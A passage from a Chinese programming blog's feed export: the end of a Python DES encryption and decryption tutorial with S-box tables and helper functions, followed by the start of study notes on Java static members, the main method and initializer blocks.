class="number">13</span>,  <span class="number">1</span>,  <span class="number">5</span>,  <span class="number">8</span>, <span class="number">12</span>,  <span class="number">6</span>,  <span class="number">9</span>,  <span class="number">3</span>,  <span class="number">2</span>, <span class="number">15</span>,</span><br><span class="line">      <span class="number">13</span>,  <span class="number">8</span>, <span class="number">10</span>,  <span class="number">1</span>,  <span class="number">3</span>, <span class="number">15</span>,  <span class="number">4</span>,  <span class="number">2</span>, <span class="number">11</span>,  <span class="number">6</span>,  <span class="number">7</span>, <span class="number">12</span>,  <span class="number">0</span>,  <span class="number">5</span>, <span class="number">14</span>,  <span class="number">9</span>]</span><br><span class="line"><span class="comment"># S3盒</span></span><br><span class="line">S3 = [<span class="number">10</span>,  <span class="number">0</span>,  <span class="number">9</span>, <span class="number">14</span>,  <span class="number">6</span>,  <span class="number">3</span>, <span class="number">15</span>,  <span class="number">5</span>,  <span class="number">1</span>, <span class="number">13</span>, <span class="number">12</span>,  <span class="number">7</span>, <span class="number">11</span>,  <span class="number">4</span>,  <span class="number">2</span>,  <span class="number">8</span>,</span><br><span class="line">      <span class="number">13</span>,  <span class="number">7</span>,  <span class="number">0</span>,  <span class="number">9</span>,  <span class="number">3</span>,  <span class="number">4</span>,  <span class="number">6</span>, <span class="number">10</span>,  <span class="number">2</span>,  <span class="number">8</span>,  <span class="number">5</span>, <span class="number">14</span>, <span class="number">12</span>, <span class="number">11</span>, <span class="number">15</span>,  <span class="number">1</span>,</span><br><span class="line">      <span class="number">13</span>,  <span class="number">6</span>,  <span class="number">4</span>,  <span class="number">9</span>,  <span class="number">8</span>, <span class="number">15</span>,  <span class="number">3</span>,  <span class="number">0</span>, <span class="number">11</span>,  <span class="number">1</span>,  <span class="number">2</span>, <span class="number">12</span>,  <span class="number">5</span>, <span class="number">10</span>, <span class="number">14</span>,  <span class="number">7</span>,</span><br><span class="line">      <span class="number">1</span>, <span class="number">10</span>, <span class="number">13</span>,  <span class="number">0</span>,  <span class="number">6</span>,  <span class="number">9</span>,  <span class="number">8</span>,  <span class="number">7</span>,  <span class="number">4</span>, <span class="number">15</span>, <span class="number">14</span>,  <span class="number">3</span>, <span class="number">11</span>,  <span class="number">5</span>,  <span class="number">2</span>, <span class="number">12</span>]</span><br><span class="line"><span class="comment"># S4盒</span></span><br><span class="line">S4 = [<span class="number">7</span>, <span class="number">13</span>, <span class="number">14</span>,  <span class="number">3</span>,  <span class="number">0</span>,  <span class="number">6</span>,  <span class="number">9</span>, <span class="number">10</span>,  <span class="number">1</span>,  <span class="number">2</span>,  <span class="number">8</span>,  <span class="number">5</span>, <span class="number">11</span>, <span class="number">12</span>,  <span class="number">4</span>, <span class="number">15</span>,</span><br><span class="line">      <span class="number">13</span>,  <span class="number">8</span>, <span class="number">11</span>,  <span class="number">5</span>,  <span class="number">6</span>, <span class="number">15</span>,  <span class="number">0</span>,  <span class="number">3</span>,  <span class="number">4</span>,  <span class="number">7</span>,  <span class="number">2</span>, <span class="number">12</span>,  <span class="number">1</span>, <span class="number">10</span>, <span class="number">14</span>,  <span class="number">9</span>,</span><br><span class="line">      <span class="number">10</span>,  <span class="number">6</span>,  <span class="number">9</span>,  <span class="number">0</span>, <span class="number">12</span>, <span class="number">11</span>,  <span class="number">7</span>, <span class="number">13</span>, <span class="number">15</span>,  <span class="number">1</span>,  <span class="number">3</span>, <span class="number">14</span>,  <span class="number">5</span>,  <span class="number">2</span>,  <span class="number">8</span>,  <span class="number">4</span>,</span><br><span class="line">      <span class="number">3</span>, <span class="number">15</span>,  <span class="number">0</span>,  <span class="number">6</span>, <span class="number">10</span>,  <span class="number">1</span>, <span class="number">13</span>,  <span class="number">8</span>,  <span class="number">9</span>,  <span class="number">4</span>,  <span class="number">5</span>, <span class="number">11</span>, <span class="number">12</span>,  <span class="number">7</span>,  <span class="number">2</span>, <span class="number">14</span>]</span><br><span class="line"><span class="comment"># S5盒</span></span><br><span class="line">S5 = [<span class="number">2</span>, <span class="number">12</span>,  <span class="number">4</span>,  <span class="number">1</span>,  <span class="number">7</span>, <span class="number">10</span>, <span class="number">11</span>,  <span class="number">6</span>,  <span class="number">8</span>,  <span class="number">5</span>,  <span class="number">3</span>, <span class="number">15</span>, <span class="number">13</span>,  <span class="number">0</span>, <span class="number">14</span>,  <span class="number">9</span>,</span><br><span class="line">      <span class="number">14</span>, <span class="number">11</span>,  <span class="number">2</span>, <span class="number">12</span>,  <span class="number">4</span>,  <span class="number">7</span>, <span class="number">13</span>,  <span class="number">1</span>,  <span class="number">5</span>,  <span class="number">0</span>, <span class="number">15</span>, <span class="number">10</span>,  <span class="number">3</span>,  <span class="number">9</span>,  <span class="number">8</span>,  <span class="number">6</span>,</span><br><span class="line">      <span class="number">4</span>,  <span class="number">2</span>,  <span class="number">1</span>, <span class="number">11</span>, <span class="number">10</span>, <span class="number">13</span>,  <span class="number">7</span>,  <span class="number">8</span>, <span class="number">15</span>,  <span class="number">9</span>, <span class="number">12</span>,  <span class="number">5</span>,  <span class="number">6</span>,  <span class="number">3</span>,  <span class="number">0</span>, <span class="number">14</span>,</span><br><span class="line">      <span class="number">11</span>,  <span class="number">8</span>, <span class="number">12</span>,  <span class="number">7</span>,  <span class="number">1</span>, <span class="number">14</span>,  <span class="number">2</span>, <span class="number">13</span>,  <span class="number">6</span>, <span class="number">15</span>,  <span class="number">0</span>,  <span class="number">9</span>, <span class="number">10</span>,  <span class="number">4</span>,  <span class="number">5</span>,  <span class="number">3</span>]</span><br><span class="line"><span class="comment"># S6盒</span></span><br><span class="line">S6 = [<span class="number">12</span>,  <span class="number">1</span>, <span class="number">10</span>, <span class="number">15</span>,  <span class="number">9</span>,  <span class="number">2</span>,  <span class="number">6</span>,  <span class="number">8</span>,  <span class="number">0</span>, <span class="number">13</span>,  <span class="number">3</span>,  <span class="number">4</span>, <span class="number">14</span>,  <span class="number">7</span>,  <span class="number">5</span>, <span class="number">11</span>,</span><br><span class="line">      <span class="number">10</span>, <span class="number">15</span>,  <span class="number">4</span>,  <span class="number">2</span>,  <span class="number">7</span>, <span class="number">12</span>,  <span class="number">9</span>,  <span class="number">5</span>,  <span class="number">6</span>,  <span class="number">1</span>, <span class="number">13</span>, <span class="number">14</span>,  <span class="number">0</span>, <span class="number">11</span>,  <span class="number">3</span>,  <span class="number">8</span>,</span><br><span class="line">      <span class="number">9</span>, <span class="number">14</span>, <span class="number">15</span>,  <span class="number">5</span>,  <span class="number">2</span>,  <span class="number">8</span>, <span class="number">12</span>,  <span class="number">3</span>,  <span class="number">7</span>,  <span class="number">0</span>,  <span class="number">4</span>, <span class="number">10</span>,  <span class="number">1</span>, <span class="number">13</span>, <span class="number">11</span>,  <span class="number">6</span>,</span><br><span class="line">      <span class="number">4</span>,  <span class="number">3</span>,  <span class="number">2</span>, <span class="number">12</span>,  <span class="number">9</span>,  <span class="number">5</span>, <span class="number">15</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">14</span>,  <span class="number">1</span>,  <span class="number">7</span>,  <span class="number">6</span>,  <span class="number">0</span>,  <span class="number">8</span>, <span class="number">13</span>]</span><br><span class="line"><span class="comment"># S7盒</span></span><br><span class="line">S7 = [<span class="number">4</span>, <span class="number">11</span>,  <span class="number">2</span>, <span class="number">14</span>, <span class="number">15</span>,  <span class="number">0</span>,  <span class="number">8</span>, <span class="number">13</span>,  <span class="number">3</span>, <span class="number">12</span>,  <span class="number">9</span>,  <span class="number">7</span>,  <span class="number">5</span>, <span class="number">10</span>,  <span class="number">6</span>,  <span class="number">1</span>,</span><br><span class="line">      <span class="number">13</span>,  <span class="number">0</span>, <span class="number">11</span>,  <span class="number">7</span>,  <span class="number">4</span>,  <span class="number">9</span>,  <span class="number">1</span>, <span class="number">10</span>, <span class="number">14</span>,  <span class="number">3</span>,  <span class="number">5</span>, <span class="number">12</span>,  <span class="number">2</span>, <span class="number">15</span>,  <span class="number">8</span>,  <span class="number">6</span>,</span><br><span class="line">      <span class="number">1</span>,  <span class="number">4</span>, <span class="number">11</span>, <span class="number">13</span>, <span class="number">12</span>,  <span class="number">3</span>,  <span class="number">7</span>, <span class="number">14</span>, <span class="number">10</span>, <span class="number">15</span>,  <span class="number">6</span>,  <span class="number">8</span>,  <span class="number">0</span>,  <span class="number">5</span>,  <span class="number">9</span>,  <span class="number">2</span>,</span><br><span class="line">      <span class="number">6</span>, <span class="number">11</span>, <span class="number">13</span>,  <span class="number">8</span>,  <span class="number">1</span>,  <span class="number">4</span>, <span class="number">10</span>,  <span class="number">7</span>,  <span class="number">9</span>,  <span class="number">5</span>,  <span class="number">0</span>, <span class="number">15</span>, <span class="number">14</span>,  <span class="number">2</span>,  <span class="number">3</span>, <span class="number">12</span>]</span><br><span class="line"><span class="comment"># S8盒</span></span><br><span class="line">S8 = [<span class="number">13</span>,  <span class="number">2</span>,  <span class="number">8</span>,  <span class="number">4</span>,  <span class="number">6</span>, <span class="number">15</span>, <span class="number">11</span>,  <span class="number">1</span>, <span class="number">10</span>,  <span class="number">9</span>,  <span class="number">3</span>, <span class="number">14</span>,  <span class="number">5</span>,  <span class="number">0</span>, <span class="number">12</span>,  <span class="number">7</span>,</span><br><span class="line">      <span class="number">1</span>, <span class="number">15</span>, <span class="number">13</span>,  <span class="number">8</span>, <span class="number">10</span>,  <span class="number">3</span>,  <span class="number">7</span>,  <span class="number">4</span>, <span class="number">12</span>,  <span class="number">5</span>,  <span class="number">6</span>, <span class="number">11</span>,  <span class="number">0</span>, <span class="number">14</span>,  <span class="number">9</span>,  <span class="number">2</span>,</span><br><span class="line">      <span class="number">7</span>, <span class="number">11</span>,  <span class="number">4</span>,  <span class="number">1</span>,  <span class="number">9</span>, <span class="number">12</span>, <span class="number">14</span>,  <span class="number">2</span>,  <span class="number">0</span>,  <span class="number">6</span>, <span class="number">10</span>, <span class="number">13</span>, <span class="number">15</span>,  <span class="number">3</span>,  <span class="number">5</span>,  <span class="number">8</span>,</span><br><span class="line">      <span class="number">2</span>,  <span class="number">1</span>, <span class="number">14</span>,  <span class="number">7</span>,  <span class="number">4</span>, <span class="number">10</span>,  <span class="number">8</span>, <span class="number">13</span>, <span class="number">15</span>, <span class="number">12</span>,  <span class="number">9</span>,  <span class="number">0</span>,  <span class="number">3</span>,  <span class="number">5</span>,  <span class="number">6</span>, <span class="number">11</span>]</span><br><span class="line"><span class="comment"># S盒</span></span><br><span class="line">S = [S1,S2,S3,S4,S5,S6,S7,S8]</span><br><span class="line"><span class="comment"># p盒</span></span><br><span class="line">p_table = [<span class="number">16</span>,  <span class="number">7</span>, <span class="number">20</span>, <span class="number">21</span>, <span class="number">29</span>, <span class="number">12</span>, <span class="number">28</span>, <span class="number">17</span>,</span><br><span class="line">           <span class="number">1</span>, <span class="number">15</span>, <span class="number">23</span>, <span class="number">26</span>,  <span class="number">5</span>, <span class="number">18</span>, <span class="number">31</span>, <span class="number">10</span>,</span><br><span class="line">           <span class="number">2</span>,  <span class="number">8</span>, <span class="number">24</span>, <span class="number">14</span>, <span class="number">32</span>, <span class="number">27</span>,  <span class="number">3</span>,  <span class="number">9</span>,</span><br><span class="line">           <span class="number">19</span>, <span class="number">13</span>, <span class="number">30</span>,  <span class="number">6</span>, <span class="number">22</span>, <span class="number">11</span>,  <span class="number">4</span>, <span class="number">25</span>]</span><br><span class="line"><span class="comment"># 10进制转4位二进制</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">int2bit</span>(<span class="params">n</span>):</span></span><br><span class="line">    a = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">        a.insert(<span class="number">0</span>,<span class="built_in">str</span>(n%<span class="number">2</span>))</span><br><span class="line">        n = <span class="built_in">int</span>(n/<span class="number">2</span>)</span><br><span class="line">    <span class="keyword">return</span> a</span><br><span class="line"><span class="comment"># IP置换，op为0为加密置换，op为1表示解密置换</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">IP</span>(<span class="params">text,op</span>):</span></span><br><span class="line">    temp = [<span class="number">0</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">64</span>)]</span><br><span class="line">    <span class="keyword">if</span> op == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">64</span>):</span><br><span class="line">            temp[i] = text[IP_table[i]-<span class="number">1</span>]</span><br><span class="line">        <span class="keyword">return</span> temp</span><br><span class="line">    <span class="keyword">if</span> op == <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">64</span>):</span><br><span class="line">            temp[i] = text[Inv_IP_table[i]-<span class="number">1</span>]</span><br><span class="line">        <span class="keyword">return</span> temp</span><br><span class="line"><span class="comment"># E盒扩展</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Extend</span>(<span class="params">text</span>):</span></span><br><span class="line">    extend = [<span class="number">0</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">48</span>)]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">48</span>):</span><br><span class="line">        extend[i] = text[extend_table[i]-<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">return</span>  extend</span><br><span class="line"><span class="comment"># S盒变换</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">s_Replace</span>(<span class="params">text</span>):</span></span><br><span class="line">    sResult = [<span class="number">0</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>)]</span><br><span class="line">    <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">        row = <span class="number">2</span> * <span class="built_in">int</span>(text[k*<span class="number">6</span>]) + <span class="built_in">int</span>(text[k*<span class="number">6</span>+<span class="number">5</span>])</span><br><span class="line">        column = <span class="number">8</span>*<span class="built_in">int</span>(text[k*<span class="number">6</span>+<span class="number">1</span>]) + <span class="number">4</span>*<span class="built_in">int</span>(text[k*<span class="number">6</span>+<span class="number">2</span>]) + <span class="number">2</span>*<span class="built_in">int</span>(text[k*<span class="number">6</span>+<span class="number">3</span>]) + <span class="built_in">int</span>(text[k*<span class="number">6</span>+<span class="number">4</span>])</span><br><span class="line">        temp = S[k][row*<span class="number">16</span>+column]</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">            sResult[<span class="number">4</span>*k + i] = int2bit(temp)[i]</span><br><span class="line">    <span class="keyword">return</span>  sResult</span><br><span class="line"><span class="comment"># P盒置换</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">p_Replace</span>(<span class="params">text</span>):</span></span><br><span class="line">    pResult = [<span class="number">0</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>)]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">        pResult[i] = text[p_table[i]-<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">return</span> pResult</span><br><span class="line"><span class="comment"># 异或运算</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Xor</span>(<span class="params">bit1,bit2</span>):</span></span><br><span class="line">    xorResult = [<span class="number">0</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(bit1))]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(bit1)):</span><br><span class="line">        xorResult[i] = <span class="built_in">str</span>(<span class="built_in">int</span>(bit1[i])^<span class="built_in">int</span>(bit2[i]))</span><br><span class="line">    <span class="keyword">return</span> xorResult</span><br></pre></td></tr></table></figure>
<h3 id="加密函数"><a href="#加密函数" class="headerlink" title="加密函数"></a>加密函数</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment"># /*</span></span><br><span class="line"><span class="comment">#  * @Author: Barry</span></span><br><span class="line"><span class="comment">#  * @Date: 2020-03-30 16:02:41</span></span><br><span class="line"><span class="comment">#  * @Last Modified by: Barry</span></span><br><span class="line"><span class="comment">#  * @Last Modified time: 2020-03-30 16:03:52</span></span><br><span class="line"><span class="comment">#  */</span></span><br><span class="line"><span class="keyword">import</span> creatSubkey <span class="keyword">as</span> cs</span><br><span class="line"><span class="keyword">import</span>  f_Function <span class="keyword">as</span> f</span><br><span class="line"><span class="comment">#16进制转2进制</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hex2bin</span>(<span class="params">text</span>):</span></span><br><span class="line">    result = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(text)):</span><br><span class="line">        result.extend(f.int2bit(<span class="built_in">int</span>(text[i],<span class="number">16</span>)))</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"><span class="comment"># 2进制转16进制</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">bin2hex</span>(<span class="params">text</span>):</span></span><br><span class="line">    result = []</span><br><span class="line">    q = <span class="built_in">len</span>(text)//<span class="number">4</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(q):</span><br><span class="line">        dec = <span class="built_in">int</span>(text[<span class="number">4</span>*i])*<span class="number">8</span> + <span class="built_in">int</span>(text[<span class="number">4</span>*i+<span class="number">1</span>])*<span class="number">4</span>+<span class="built_in">int</span>(text[<span class="number">4</span>*i+<span class="number">2</span>])*<span class="number">2</span> + <span class="built_in">int</span>(text[<span class="number">4</span>*i+<span class="number">3</span>])*<span class="number">1</span></span><br><span class="line">        x = <span class="built_in">hex</span>(dec)[<span class="number">2</span>:]</span><br><span class="line">        result.extend(x)</span><br><span class="line">    rs = <span class="string">&#x27;&#x27;</span>.join(result)</span><br><span class="line">    <span class="keyword">return</span> rs</span><br><span class="line"><span class="comment"># 加密步骤</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">DESEncryption</span>(<span class="params">plaintext,secret_key</span>):</span></span><br><span class="line">    secret_key = cs.SubKey(secret_key) <span class="comment">#密钥初始置换</span></span><br><span class="line">    text1 = f.IP(plaintext,<span class="number">0</span>)</span><br><span class="line">    L = [text1[i] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>)]</span><br><span class="line">    R = [text1[i] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>,<span class="number">64</span>)]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">        temp = R</span><br><span class="line">        temp = f.Extend(temp)</span><br><span class="line">        temp = f.Xor(temp,secret_key[i])</span><br><span class="line">        temp = f.s_Replace(temp)</span><br><span class="line">        temp = f.p_Replace(temp)</span><br><span class="line">        temp = f.Xor(temp,L)</span><br><span class="line">        L = R</span><br><span class="line">        R = temp</span><br><span class="line">    L,R = R,L</span><br><span class="line">    cText = L</span><br><span class="line">    cText.extend((R))</span><br><span class="line">    cText = f.IP(cText,<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">return</span> bin2hex(cText)</span><br><span class="line"><span class="comment">#程序入口</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="comment"># 输入明文</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;读入16位十六进制明文&#x27;</span>)</span><br><span class="line">    f1 = <span class="built_in">open</span>(<span class="string">&#x27;des_plaintext.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">    plaintext = f1.read()</span><br><span class="line">    f1.close()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;读入完成&quot;</span>)</span><br><span class="line">    <span class="comment"># 输入密钥</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;读入16位十六进制密钥&quot;</span>)</span><br><span class="line">    <span class="comment"># with open(&#x27;des_sercetkey.txt&#x27;,&#x27;r&#x27;) as f:</span></span><br><span class="line">    <span class="comment">#     secret_key = f.read()</span></span><br><span class="line">    f2 = <span class="built_in">open</span>(<span class="string">&#x27;des_sercetkey.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">    secret_key = f2.read()</span><br><span class="line">    f2.close()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;读入完成&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;算法开始&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;明文为：&quot;</span> + plaintext)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;密钥为：&quot;</span> + secret_key)</span><br><span class="line">    plaintext = hex2bin(plaintext)</span><br><span class="line">    secret_key = hex2bin(secret_key)</span><br><span class="line">    <span class="comment"># 算法开始</span></span><br><span class="line">    Ciphertext = DESEncryption(plaintext, secret_key)</span><br><span class="line">    <span class="comment"># 打印密文</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;加密后密文为&quot;</span> + Ciphertext)</span><br></pre></td></tr></table></figure>
<h3 id="解密函数"><a href="#解密函数" class="headerlink" title="解密函数"></a>解密函数</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">import</span> creatSubkey <span class="keyword">as</span> cs</span><br><span class="line"><span class="keyword">import</span> f_Function <span class="keyword">as</span> f</span><br><span class="line"><span class="comment">#16进制转2进制</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hex2bin</span>(<span class="params">text</span>):</span></span><br><span class="line">    result = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(text)):</span><br><span class="line">        result.extend(f.int2bit(<span class="built_in">int</span>(text[i],<span class="number">16</span>)))</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"><span class="comment"># 2进制转16进制</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">bin2hex</span>(<span class="params">text</span>):</span></span><br><span class="line">    result = []</span><br><span class="line">    q = <span class="built_in">len</span>(text)//<span class="number">4</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(q):</span><br><span class="line">        dec = <span class="built_in">int</span>(text[<span class="number">4</span>*i])*<span class="number">8</span> + <span class="built_in">int</span>(text[<span class="number">4</span>*i+<span class="number">1</span>])*<span class="number">4</span>+<span class="built_in">int</span>(text[<span class="number">4</span>*i+<span class="number">2</span>])*<span class="number">2</span> + <span class="built_in">int</span>(text[<span class="number">4</span>*i+<span class="number">3</span>])*<span class="number">1</span></span><br><span class="line">        x = <span class="built_in">hex</span>(dec)[<span class="number">2</span>:]</span><br><span class="line">        result.extend(x)</span><br><span class="line">    rs = <span class="string">&#x27;&#x27;</span>.join(result)</span><br><span class="line">    <span class="keyword">return</span> rs</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Decryption</span>(<span class="params">text,key</span>):</span></span><br><span class="line">    keylist = cs.SubKey(key)</span><br><span class="line">    text1 = f.IP(text,<span class="number">0</span>)</span><br><span class="line">    L = [text1[i] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>)]</span><br><span class="line">    R = [text1[i] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>,<span class="number">64</span>)]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">        temp = R</span><br><span class="line">        temp = f.Extend(temp)</span><br><span class="line">        temp = f.Xor(temp, keylist[<span class="number">15</span>-i])</span><br><span class="line">        temp = f.s_Replace(temp)</span><br><span class="line">        temp = f.p_Replace(temp)</span><br><span class="line">        temp = f.Xor(temp, L)</span><br><span class="line">        L = R</span><br><span class="line">        R = temp</span><br><span class="line">    L, R = R, L</span><br><span class="line">    cText = L</span><br><span class="line">    cText.extend((R))</span><br><span class="line">    cText = f.IP(cText, <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">return</span> bin2hex(cText)</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;读入16位十六进制密文&#x27;</span>)</span><br><span class="line">    f1 = <span class="built_in">open</span>(<span class="string">&#x27;des_ciphertext.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">    ciphertext = f1.read()</span><br><span class="line">    f1.close()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;读入完成&quot;</span>)</span><br><span class="line">    <span class="comment"># 输入密钥</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;读入16位十六进制密钥&quot;</span>)</span><br><span class="line">    <span class="comment"># with open(&#x27;des_sercetkey.txt&#x27;,&#x27;r&#x27;) as f:</span></span><br><span class="line">    <span class="comment">#     secret_key = f.read()</span></span><br><span class="line">    f2 = <span class="built_in">open</span>(<span class="string">&#x27;des_sercetkey.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">    secret_key = f2.read()</span><br><span class="line">    f2.close()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;读入完成&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;算法开始&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;密文为：&quot;</span> + ciphertext)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;密钥为：&quot;</span> + secret_key)</span><br><span class="line">    ciphertext = hex2bin(ciphertext)</span><br><span class="line">    secret_key = hex2bin(secret_key)</span><br><span class="line">    <span class="comment"># 算法开始</span></span><br><span class="line">    plaintext = Decryption(ciphertext, secret_key)</span><br><span class="line">    <span class="comment"># 打印密文</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;解密后明文为&quot;</span> + plaintext)</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>本文参考链接：<br>原文链接：<br><a href="https://blog.csdn.net/qq_27570955/article/details/52442092">https://blog.csdn.net/qq_27570955/article/details/52442092</a><br><a href="https://www.cnblogs.com/songwenlong/p/5944139.html">https://www.cnblogs.com/songwenlong/p/5944139.html</a></p>
]]></content>
      <categories>
        <category>算法</category>
      </categories>
      <tags>
        <tag>算法</tag>
      </tags>
  </entry>
  <entry>
    <title>Java-高级</title>
    <url>/2021/10/19/Java-%E9%AB%98%E7%BA%A7/</url>
    <content><![CDATA[<h2 id="面向对象编程"><a href="#面向对象编程" class="headerlink" title="面向对象编程"></a>面向对象编程</h2><h3 id="类变量和类方法"><a href="#类变量和类方法" class="headerlink" title="类变量和类方法"></a>类变量和类方法</h3><h4 id="类变量"><a href="#类变量" class="headerlink" title="类变量"></a>类变量</h4><p>类变量也叫静态变量，是该类的所有对象共享的变量，任何一个该类的对象去访问它时，取到的都是相同的值，同样任何一个该类的对象去修改它时，修改的也是同一个变量</p>
<ol>
<li>static(静态)变量是同一个类所有对象共享</li>
<li>sataic类变量在类加载的时候就生成</li>
</ol>
<p>定义语法：<br>访问修饰符 static 数据类型 变量名（推荐）<br>static 访问修饰符 数据类型 变量名</p>
<h4 id="类变量与实例变量的区别"><a href="#类变量与实例变量的区别" class="headerlink" title="类变量与实例变量的区别"></a>类变量与实例变量的区别</h4><p>类变量是该类的所有对象共享的，而实例变量是每个对象独享的</p>
<h4 id="类方法"><a href="#类方法" class="headerlink" title="类方法"></a>类方法</h4><p>类方法也叫静态方法<br>静态方法使用时可以直接使用</p>
<ol>
<li>类方法和普通方法都是随着类的加载而加载，将结构信息存储在方法区：类方法中无this的参数，普通方法中隐含着this的参数</li>
<li>类方法可以通过类名调用，也可以通过对象名调用</li>
<li>普通方法和对象有关，需要通过对象名调用</li>
<li>类方法中不允许使用和对象有关的关键字，比如this和super。普通方法可以</li>
<li>静态方法中只能访问静态变量或静态方法</li>
<li>普通成员方法，既可以访问非静态成员，也可以访问静态成员</li>
<li>静态方法可以被继承，但不能被重写</li>
</ol>
<h3 id="理解main方法语法"><a href="#理解main方法语法" class="headerlink" title="理解main方法语法"></a>理解main方法语法</h3><ol>
<li>main方法是java虚拟机调用</li>
<li>java虚拟机需要调用类的main()方法，所以该方法的访问权限必须是public</li>
<li>java虚拟机在执行main()方法时不必创建对象，所以该方法必须是static</li>
<li>该方法接收String类型的数组参数，该数组中保存执行java命令时传递给所运行的类的参数</li>
<li>java 执行的程序 参数1 参数2 参数3</li>
<li>在main()方法中，可以直接调用main方法所在类的静态方法或静态属性</li>
<li>不能直接访问该类中的非静态成员，必须创建该类的一个实例对象后，才能通过这个对象去访问类中的非静态成员</li>
</ol>
<h3 id="代码块"><a href="#代码块" class="headerlink" title="代码块"></a>代码块</h3><p>又称为初始化块，属于类中的成员，类似于方法，将逻辑语句封装在方法体中，通过{}包围起来<br>但和方法不同，没有方法名，没有返回，没有参数，只有方法体，而且不用通过对象或类显式调用，而是加载类时，或创建对象时隐式调用</p>
<p>基本语法<br>[修饰符]{<br>    代码<br>};</p>
<h4 id="代码块的好处"><a href="#代码块的好处" class="headerlink" title="代码块的好处"></a>代码块的好处</h4><ol>
<li>相当于另外一种形式的构造器，可以做初始化的操作</li>
